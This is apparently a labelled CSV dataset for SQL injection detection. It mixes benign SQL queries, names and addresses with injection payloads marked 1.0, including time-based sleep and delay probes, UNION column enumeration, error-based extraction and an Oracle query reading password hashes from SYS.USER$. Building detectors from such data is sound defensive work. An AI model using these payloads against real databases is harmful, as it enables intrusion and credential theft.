Sentence,Label,Processed_Sentence
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',1.0,0%'  )   and   (  select * from   (  select  (  sleep  (  0   )    )     )  fzno  )   and   (  '%'  =  '
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1.0," and 0  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  0   )    )    and 'i'  =  'i"
"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",1.0,"-0'||  (  select 'sofs' where 0  =  0 union all select 0,0,0,0,0#"
SELECT option_value FROM wp_options WHERE option_name  =  '_options_youtube_url' LIMIT 1,0.0,select option_value from wp_options where option_name  =  '_options_youtube_url' limit 0
SELECT AVG ( prevent )  FROM becoming  SELECT SUM ( listen ) ,0.0,select avg ( prevent )  from becoming  select sum ( listen ) 
1'   )    )    as zari where 6847  =  6847,1.0,0'   )    )    as zari where 0  =  0
"lugar higuera canaria, 169",0.0,"lugar higuera canaria, 0"
" SELECT * FROM tales ORDER BY how ASC, break DESC",0.0," select * from tales order by how asc, break desc"
6382,0.0,0
"  SELECT world AS hide, youth AS [flat]  FROM brave",0.0,"  select world as hide, youth as [flat]  from brave"
-2951 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # gwqv,1.0,-0 or 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )  # gwqv
"1""  )   where 9295  =  9295 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1.0,"0""  )   where 0  =  0 and 0  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )  --"
SELECT COUNT ( DISTINCT national )  FROM good,0.0,select count ( distinct national )  from good
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'ekqv'  =  'ekqv",1.0,"0'  )   or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   and   (  'ekqv'  =  'ekqv"
26141,0.0,0
"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1.0,"-0""  )   as crfi where 0  =  0 union all select 0,0,0,0,0,0,0,0,0,0--"
1  )   or sleep  (  5  )  #,1.0,0  )   or sleep  (  0  )  #
7636020000000000,0.0,0
SELECT AVG ( rice ) FROM car,0.0,select avg ( rice ) from car
SELECT DISTINCT missing FROM son,0.0,select distinct missing from son
SELECT * FROM ought FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from ought fetch first 0 percent rows only
"1""  )   union all select null,null,null--",1.0,"0""  )   union all select null,null,null--"
SELECT smooth ( s ) FROM stone INNER JOIN,0.0,select smooth ( s ) from stone inner join
SELECT TOP 3 * FROM list WHERE build = 'pilot' SELECT * FROM native,0.0,select top 0 * from list where build = 'pilot' select * from native
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1.0,"0%"" and 0  =  convert  (  int,  (  select char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and ""%""  =  """
"  SELECT anyID AS ID, atom AS beautiful FROM dry",0.0,"  select anyid as id, atom as beautiful from dry"
1'||  (  select 'qdkb' where 4331  =  4331,1.0,0'||  (  select 'qdkb' where 0  =  0
"1%"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1.0,"0%"" and 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- ivku",1.0,"0 or   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )  -- ivku"
SELECT * FROM balance WHERE return = 'atomic'  OR neck = 'plant',0.0,select * from balance where return = 'atomic'  or neck = 'plant'
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1.0," select * from users where id  =  '0' union select \.,@@version -- 0'"
if  (  4135  =  2165  )   select 4135 else drop function otyy--,1.0,if  (  0  =  0  )   select 0 else drop function otyy--
"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",1.0,"-0%""   )    )    union all select 0,0,0,0,0,0,0#"
4344810000000000,0.0,0
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""{?"" or 0  =  0 -- 0"
boes@cumbareback.kz,0.0,boes@cumbareback.kz
1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1.0,0'  )   as jrqh where 0  =  0 and   (  select * from   (  select  (  sleep  (  0   )    )     )  gcrr  )  #
"1""  )   where 8095  =  8095 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1.0,"0""  )   where 0  =  0 and 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )  --"
a65esad0,0.0,a0esad0
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1.0,"0""   )    )    procedure analyse  (  extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0   )    )   ,0  )   and    (    (   ""jzbb""  =  ""jzbb"
8232,0.0,0
SELECT * FROM satellites ORDER BY concerned,0.0,select * from satellites order by concerned
SELECT * FROM important WHERE habit = 'parent',0.0,select * from important where habit = 'parent'
"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",1.0,"-0%""   )    )    union all select 0,0,0,0,0#"
"1'+  (  select 'ngdk' where 7264  =  7264 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1.0,"0'+  (  select 'ngdk' where 0  =  0 and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )     )  +'"
-4410 where 5749  =  5749 or 1317  =  9823--,1.0,-0 where 0  =  0 or 0  =  0--
"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",1.0,"0'+  (  select cjcp where 0  =  0 union all select null,null,null,null,null,null,null#"
"INSERT INTO motor ( gasoline, something, single, because, below, announced )  VALUES  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",0.0,"insert into motor ( gasoline, something, single, because, below, announced )  values  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  "
SELECT lunch ( s FROM dead RIGHT JOIN,0.0,select lunch ( s from dead right join
16813,0.0,0
462514000000000,0.0,0
cebuano,0.0,cebuano
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1.0,"-0' union all select 0,0,0,0,0,0,0--"
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1.0,0' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  vwyq  )  #
SELECT * FROM limited WHERE leader = 'farmer',0.0,select * from limited where leader = 'farmer'
SELECT * FROM per WHERE plus BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from per where plus between '0-0-0' and '0-0-0'
-5211 union all select 1754--,1.0,-0 union all select 0--
stefana1,0.0,stefana0
"   SELECT COUNT ( printed ) , zoo FROM struggle BY dish",0.0,"   select count ( printed ) , zoo from struggle by dish"
"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1.0,"-0"" or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )  "
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367676 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
SELECT * FROM running WHERE song = 'window'  AND  ( deeply = 'slight' OR exciting = 'sale' ) ,0.0,select * from running where song = 'window'  and  ( deeply = 'slight' or exciting = 'sale' ) 
decour raichs,0.0,decour raichs
SELECT COUNT ( DISTINCT pupil )  FROM movement,0.0,select count ( distinct pupil )  from movement
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,1.0,0  )   and 0  =    (  select 0 from pg_sleep  (  0   )    )    and   (  0  =  0
"1""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""epwi"" like ""epwi",1.0,"0""   )    )     )   and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )   and    (    (     (  ""epwi"" like ""epwi"
1  )   and 2457  =  8146,1.0,0  )   and 0  =  0
"INSERT INTO doll ( every, dull, strange, seven, charge, political )  VALUES  ( 'addition', 'express'. wall', 'corner', 'taken', 'darkness', 'activity' )  ",0.0,"insert into doll ( every, dull, strange, seven, charge, political )  values  ( 'addition', 'express'. wall', 'corner', 'taken', 'darkness', 'activity' )  "
mara,0.0,mara
hemisfero,0.0,hemisfero
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1.0,"-0"" union all select 0,0,0,0,0,0,0,0,0,0--"
" SELECT * FROM wherever ORDER BY consonant ASC, within DESC",0.0," select * from wherever order by consonant asc, within desc"
"-3731'   )    )     )   or elt  (  7540  =  1412,1412  )   and    (    (     (  'iwch'  =  'iwch",1.0,"-0'   )    )     )   or elt  (  0  =  0,0  )   and    (    (     (  'iwch'  =  'iwch"
"  SELECT * FROM boat WHERE equipment NOT IN  ( 'calm', 'blue', 'except' )  ",0.0,"  select * from boat where equipment not in  ( 'calm', 'blue', 'except' )  "
"  SELECT * FROM find WHERE barn IN  ( 'put', 'war', 'opinion' )  ",0.0,"  select * from find where barn in  ( 'put', 'war', 'opinion' )  "
SELECT COUNT ( fly ) FROM series,0.0,select count ( fly ) from series
1   )    )    as jvoo where 5116  =  5116 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1.0,0   )    )    as jvoo where 0  =  0 or 0  =    (  select 0 from pg_sleep  (  0   )    )   --
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1.0,"select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0 and    (    (   ""%""  =  """
SELECT * FROM tomorrow WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from tomorrow where price not between 0 and 0
celeste_bryon@skullride.ki,0.0,celeste_bryon@skullride.ki
SELECT Count ( * )  AS imagine,0.0,select count ( * )  as imagine
SELECT * FROM he WHERE deep = 'dug'  AND  ( connected = 'picture' OR place = 'now' ) ,0.0,select * from he where deep = 'dug'  and  ( connected = 'picture' or place = 'now' ) 
"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0%'   )    )    or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,1.0,0' rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    ) 
puente la reina/gares,0.0,puente la reina/gares
10380,0.0,0
"""   )    )   ;waitfor delay '0:0:__TIME__'--",1.0,"""   )    )   ;waitfor delay '0:0:__time__'--"
c/ cardenal benilloch 171 12?h,0.0,c/ cardenal benilloch 0 0?h
SELECT * FROM wrapped WHERE NOT ability = 'brick'  AND NOT thing = 'doll',0.0,select * from wrapped where not ability = 'brick'  and not thing = 'doll'
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1.0,"-0   )    )    as cnfs where 0  =  0 union all select 0,0,0,0,0,0,0,0,0#"
san juan bosco 113 1-d,0.0,san juan bosco 0 0-d
SELECT * FROM nor WHERE notice = 'steep' FETCH FIRST 3 ROWS ONLY,0.0,select * from nor where notice = 'steep' fetch first 0 rows only
1'||  (  select 'adoe' from dual where 7662  =  7662,1.0,0'||  (  select 'adoe' from dual where 0  =  0
"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",1.0,"-0'  )   union all select 0,0,0,0,0,0,0#"
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1.0,"0""   )    )    and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr"
cunillera penades,0.0,cunillera penades
arceo feliu,0.0,arceo feliu
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,1.0,0' and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and 'foju'  =  'foju
SELECT * FROM blood WHERE    NOT have = 'clearly',0.0,select * from blood where    not have = 'clearly'
-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy,1.0,-0'   )    )     )   or 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy
"1"" and 7533  =  7533 and ""btak"" like ""btak",1.0,"0"" and 0  =  0 and ""btak"" like ""btak"
SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from every where crew between '0-0-0' and '0-0-0'
"1' where 4185  =  4185 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1.0,"0' where 0  =  0 procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0a0   )    )      )    )     )  ,0  )  --"
"calle juan de uceda, 180,",0.0,"calle juan de uceda, 0,"
terrill,0.0,terrill
1'   )    )    as wqhm where 9871  =  9871,1.0,0'   )    )    as wqhm where 0  =  0
"1%"" and 1343  =  5939#",1.0,"0%"" and 0  =  0#"
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",1.0,"0 and updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )  # dyed"
"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0""   )    )    or 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
SELECT * FROM wp_posts WHERE ID  =  28620 LIMIT 1,0.0,select * from wp_posts where id  =  0 limit 0
"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1.0,"0'+  (  select 'vfkl' where 0  =  0 and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0   )    )   +'"
"iif  (  5214  =  7412,1,1/0  )  ",1.0,"iif  (  0  =  0,0,0/0  )  "
SELECT tr.object_id FROM wp_term_relationships AS tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'nav_menu' )  AND tt.term_id IN  ( '715' )  ORDER BY tr.object_id ASC,0.0,select tr.object_id from wp_term_relationships as tr inner join wp_term_taxonomy as tt on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'nav_menu' )  and tt.term_id in  ( '0' )  order by tr.object_id asc
-4331  )   as inpx where 9804  =  9804 union all select 9804#,1.0,-0  )   as inpx where 0  =  0 union all select 0#
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ) ,0.0,select * from steam where automobile = 'pen'  and  ( electricity = 'instrument' or ordinary = 'policeman' ) 
"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1.0,"-0'+  (  select xitp where 0  =  0 union all select 0,0,0,0,0,0,0,0,0,0#"
"   SELECT hot, sometime, bareFROM earn WHERE touch  IS NOT NULL",0.0,"   select hot, sometime, barefrom earn where touch  is not null"
sleep  (  __TIME__  )  #,1.0,sleep  (  __time__  )  #
"1'||  (  select 'scqw' where 3337  =  3337 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1.0,"0'||  (  select 'scqw' where 0  =  0 or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0'||  (  select 'nbmo' from dual where 0  =  0 and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
" SELECT * FROM usually ORDER BY game, nest",0.0," select * from usually order by game, nest"
"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""jywy"" like ""jywy",1.0,"0""   )    )     )   procedure analyse  (  extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0   )    )   ,0  )   and    (    (     (  ""jywy"" like ""jywy"
firestone@artforall.ag,0.0,firestone@artforall.ag
"SELECT * FROM whatever WHERE atomic BETWEEN ""organization"" AND    ""joined""",0.0,"select * from whatever where atomic between ""organization"" and    ""joined"""
SELECT TOP 3 * FROM doubt SELECT * FROM now 3SELECT * FROM chamber,0.0,select top 0 * from doubt select * from now 0select * from chamber
SELECT AVG ( out ) FROM thee SELECT SUM ( fallen ) ,0.0,select avg ( out ) from thee select sum ( fallen ) 
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1.0," select * from users where id  =  0 union select @||0,version  (    )   -- 0"
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ) ,0.0,select avg ( mud )  from learn  select sum ( cannot ) 
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team',0.0,select * from fruit where not recall = 'wheel'  and not breathing = 'team'
olmos de esgueva,0.0,olmos de esgueva
SELECT * FROM yet WHERE point NOT LIKE 'breeze%',0.0,select * from yet where point not like 'breeze%'
SELECT did ( s )  FROM dear LEFT JOIN,0.0,select did ( s )  from dear left join
" SELECT column_name ( s )  FROM unhappy,month",0.0," select column_name ( s )  from unhappy,month"
SELECT * FROM  ( SELECT theory FROM machinery ) ,0.0,select * from  ( select theory from machinery ) 
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",1.0,"0' and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )    and 'zetf'  =  'zetf"
